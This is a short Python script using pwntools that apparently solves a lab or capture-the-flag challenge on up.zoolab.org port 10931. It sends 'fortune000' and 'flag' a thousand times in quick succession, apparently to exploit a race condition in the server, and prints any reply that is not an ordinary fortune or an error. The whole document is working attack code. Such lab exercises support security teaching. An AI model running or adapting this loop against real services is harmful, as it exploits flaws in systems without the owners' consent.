from pwn import *

if __name__ == "__main__":
    r = remote('up.zoolab.org', 10931)
    for i in range(1000):
        r.sendline("fortune000")
        r.sendline("flag")
        recv = r.recvline()
        recv = recv.decode('utf-8')
        if "Lily Tomlin" in recv or "ERROR" in recv:
            continue
        print(recv)
    r.close()